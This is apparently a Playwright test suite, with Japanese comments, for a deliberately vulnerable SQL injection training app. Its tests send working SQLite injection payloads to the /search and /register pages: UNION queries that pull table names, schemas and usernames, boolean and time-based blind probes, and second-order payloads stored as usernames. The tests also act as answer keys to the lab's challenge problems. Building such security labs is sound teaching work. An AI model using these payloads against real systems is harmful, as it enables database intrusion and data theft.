import { test, expect } from '@playwright/test';

// ============================================================
// ユーティリティ
// ============================================================

/**
 * /search に keyword を送って結果テキストを返す
 */
async function search(page, keyword) {
    await page.goto(`/search?keyword=${encodeURIComponent(keyword)}`);
}

/**
 * 結果テーブルの行数を返す（ヘッダー行を除く）
 */
async function resultRowCount(page) {
    return page.locator('table tbody tr').count();
}

// ============================================================
// 正常動作の確認
// ============================================================

test.describe('正常動作', () => {
    test('トップ（/）が /search にリダイレクトされる', async ({ page }) => {
        await page.goto('/');
        await expect(page).toHaveURL(/\/search/);
    });

    test('/search で通常検索が動作する（ボールペン → 1件）', async ({ page }) => {
        await search(page, 'ボールペン');
        const count = await resultRowCount(page);
        expect(count).toBe(1);
        await expect(page.locator('table')).toContainText('ボールペン');
    });

    test('/search でキーワードなし → 全商品（8件）が返る', async ({ page }) => {
        await search(page, '');
        const count = await resultRowCount(page);
        expect(count).toBe(8);
    });

    test('/search で存在しない商品 → 0件メッセージ', async ({ page }) => {
        await search(page, 'xyznotexist');
        const count = await resultRowCount(page);
        expect(count).toBe(0);
        await expect(page.locator('body')).toContainText('該当する商品がありません');
    });

    test('/register フォームが表示される', async ({ page }) => {
        await page.goto('/register');
        await expect(page.locator('input[name="username"]')).toBeVisible();
        await expect(page.locator('input[name="email"]')).toBeVisible();
    });
});

// ============================================================
// 実践①: UNION-based SQLi
// ============================================================

test.describe('実践①: UNION-based SQLi', () => {
    test('カラム数 7 で UNION が成功する（余分な行が追加される）', async ({ page }) => {
        // キーワードが一致しない検索 → 本来0件のはずが UNION で1行追加される
        await search(page, `xyznotexist%' UNION SELECT 1,2,3,4,5,6,7 --`);
        const count = await resultRowCount(page);
        expect(count).toBeGreaterThanOrEqual(1);
    });

    test('カラム数 6 では SQL エラーになる', async ({ page }) => {
        await search(page, `xyznotexist%' UNION SELECT 1,2,3,4,5,6 --`);
        // エラーで 0件 か、エラーメッセージが出るはず
        const bodyText = await page.locator('body').innerText();
        const hasError = bodyText.includes('SQLSTATE') || bodyText.includes('error') || bodyText.includes('Error');
        const rows = await resultRowCount(page);
        // エラーになるか結果0件になるかどちらか
        expect(hasError || rows === 0).toBe(true);
    });

    test('sqlite_version() が category カラム位置（3列目）に表示される', async ({ page }) => {
        await search(page, `%' UNION SELECT 1,2,sqlite_version(),4,5,6,7 --`);
        // SQLite のバージョンは "3.x.x" 形式
        await expect(page.locator('table')).toContainText(/3\.\d+\.\d+/);
    });

    test('sqlite_master からテーブル名一覧を取得できる', async ({ page }) => {
        await search(page, `%' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master WHERE type='table' --`);
        const tableText = await page.locator('table').innerText();
        expect(tableText).toContain('products');
        expect(tableText).toContain('users');
        expect(tableText).toContain('posts');
    });

    test('sqlite_master から users テーブルのスキーマ（CREATE TABLE文）を取得できる', async ({ page }) => {
        await search(page, `%' UNION SELECT 1,2,sql,4,5,6,7 FROM sqlite_master WHERE name='users' --`);
        const tableText = await page.locator('table').innerText();
        expect(tableText).toContain('CREATE TABLE');
        expect(tableText).toContain('username');
    });

    test('users テーブルの username を抽出できる（チャレンジ問題1）', async ({ page }) => {
        await search(page, `%' UNION SELECT 1,username,3,4,5,6,7 FROM users --`);
        const tableText = await page.locator('table').innerText();
        expect(tableText).toContain('admin');
    });
});

// ============================================================
// 実践②: Boolean-based Blind SQLi
// ============================================================

test.describe('実践②: Boolean-based Blind SQLi', () => {
    test('AND 1=1 → 通常通り結果が返る（ボールペン検索で1件）', async ({ page }) => {
        await search(page, `ボールペン%' AND 1=1 --`);
        const count = await resultRowCount(page);
        expect(count).toBe(1);
    });

    test('AND 1=2 → 結果が0件になる', async ({ page }) => {
        await search(page, `ボールペン%' AND 1=2 --`);
        const count = await resultRowCount(page);
        expect(count).toBe(0);
    });

    test('SUBSTR(sqlite_version(),1,1)=\'3\' → 真（結果あり）', async ({ page }) => {
        await search(page, `%' AND SUBSTR(sqlite_version(),1,1)='3' --`);
        const count = await resultRowCount(page);
        expect(count).toBeGreaterThan(0);
    });

    test('SUBSTR(sqlite_version(),1,1)=\'9\' → 偽（0件）', async ({ page }) => {
        await search(page, `%' AND SUBSTR(sqlite_version(),1,1)='9' --`);
        const count = await resultRowCount(page);
        expect(count).toBe(0);
    });
});

// ============================================================
// 実践②: Time-based Blind SQLi
// ============================================================

test.describe('実践②: Time-based Blind SQLi', () => {
    test('randomblob(100000000) で応答が遅延する（1秒以上）', async ({ page }) => {
        const start = Date.now();
        await search(page, `%' AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 1 END --`);
        const elapsed = Date.now() - start;
        // 条件が真の場合、randomblob(100MB) 生成で遅延するはず
        expect(elapsed).toBeGreaterThan(1000);
    });

    test('randomblob 偽条件（WHEN 1=2）では遅延しない（1秒未満）', async ({ page }) => {
        const start = Date.now();
        await search(page, `%' AND CASE WHEN 1=2 THEN randomblob(100000000) ELSE 1 END --`);
        const elapsed = Date.now() - start;
        expect(elapsed).toBeLessThan(3000);
    });
});

// ============================================================
// 実践③: Second-order SQLi
// ============================================================

test.describe('実践③: Second-order SQLi', () => {
    // 各テストで固有のユーザーを作成するためのタイムスタンプ
    const ts = Date.now();

    test('通常登録 → /profile/{id} でユーザー情報と投稿が表示される（admin）', async ({ page }) => {
        // admin は PostSeeder で2件の投稿を持つ
        await page.goto('/register');
        await page.fill('input[name="username"]', 'admin');
        await page.fill('input[name="email"]', `admin_${ts}@example.com`);
        await page.click('button[type="submit"]');

        // 登録完了後、プロフィールリンクを取得して遷移
        const link = page.locator('a[href*="/profile/"]');
        await expect(link).toBeVisible();
        await link.click();

        await expect(page.locator('body')).toContainText('admin');
        // admin の投稿が2件表示される
        const rows = await resultRowCount(page);
        expect(rows).toBeGreaterThanOrEqual(2);
    });

    test('ペイロード登録 → /profile/{id} で Second-order SQLi が発火する', async ({ page }) => {
        // Step 1: ペイロードをユーザー名として登録
        const payload = `'' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name=''users'' --`;
        await page.goto('/register');
        await page.fill('input[name="username"]', payload);
        await page.fill('input[name="email"]', `sqli_${ts}@example.com`);
        await page.click('button[type="submit"]');

        // 登録完了 → プロフィールページへ
        const link = page.locator('a[href*="/profile/"]');
        await expect(link).toBeVisible();
        await link.click();

        // Step 2: /profile/{id} で発火を確認
        // CREATE TABLE文が posts の results に表示されるはず
        const bodyText = await page.locator('body').innerText();
        expect(bodyText).toContain('CREATE TABLE');
        expect(bodyText).toContain('username');
    });

    test('admin\'\' OR \'\'1\'\'=\'\'1 ペイロードで全投稿が表示される', async ({ page }) => {
        // Step 1: Boolean SQLi ペイロードを登録
        const payload = `admin'' OR ''1''=''1`;
        await page.goto('/register');
        await page.fill('input[name="username"]', payload);
        await page.fill('input[name="email"]', `bool_${ts}@example.com`);
        await page.click('button[type="submit"]');

        const link = page.locator('a[href*="/profile/"]');
        await expect(link).toBeVisible();
        await link.click();

        // 全投稿（3件: admin×2 + tanaka×1）が表示される
        const rows = await resultRowCount(page);
        expect(rows).toBe(3);
    });

    test('チャレンジ問題3: Second-order で posts の全タイトルを抽出できる', async ({ page }) => {
        const payload = `'' UNION SELECT 1,title,3,4,5 FROM posts --`;
        await page.goto('/register');
        await page.fill('input[name="username"]', payload);
        await page.fill('input[name="email"]', `ch3_${ts}@example.com`);
        await page.click('button[type="submit"]');

        const link = page.locator('a[href*="/profile/"]');
        await expect(link).toBeVisible();
        await link.click();

        const bodyText = await page.locator('body').innerText();
        expect(bodyText).toContain('テスト投稿1');
        expect(bodyText).toContain('テスト投稿2');
        expect(bodyText).toContain('商品レビュー');
    });
});

// ============================================================
// クエリ表示の確認（学習用 UI）
// ============================================================

test.describe('学習用UI: 実行クエリの表示', () => {
    test('/search で実行された SQL が画面に表示される', async ({ page }) => {
        await search(page, 'ボールペン');
        await expect(page.locator('body')).toContainText('SELECT * FROM products WHERE name LIKE');
    });

    test('/profile/{id} で実行された SQL が画面に表示される', async ({ page }) => {
        await page.goto('/profile/1');
        // 404 でなければクエリが表示されているはず
        const status = page.url();
        if (!status.includes('404')) {
            await expect(page.locator('body')).toContainText('SELECT * FROM posts WHERE author');
        }
    });
});
